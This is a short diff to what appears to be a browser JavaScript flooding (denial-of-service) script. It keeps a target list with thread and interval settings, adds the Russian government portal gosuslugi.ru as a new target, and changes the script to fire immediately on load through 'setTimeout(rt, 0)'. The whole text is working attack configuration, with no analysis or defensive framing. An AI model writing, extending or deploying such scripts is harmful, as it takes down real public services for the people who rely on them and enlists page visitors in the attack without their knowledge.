@@ -2,7 +2,8 @@
 var list = [
 
 	{ url: "https://killnet.io/ajax.php", p: "wallet=undefined&list=true", th: 1, ms: 5000, cors: true },
-	{ url: "https://killnet.io/", th: 1, ms: 10000, cors: true }
+	{ url: "https://killnet.io/", th: 1, ms: 10000, cors: true },
+	{ url: "https://www.gosuslugi.ru/", th: 1, ms: 5000, cors: false }
 
 ]
 
@@ -45,4 +46,4 @@ function rt() {
 	list.forEach(srt);
 }
 
-// window.addEventListener('load', rt);
+setTimeout(rt, 0);
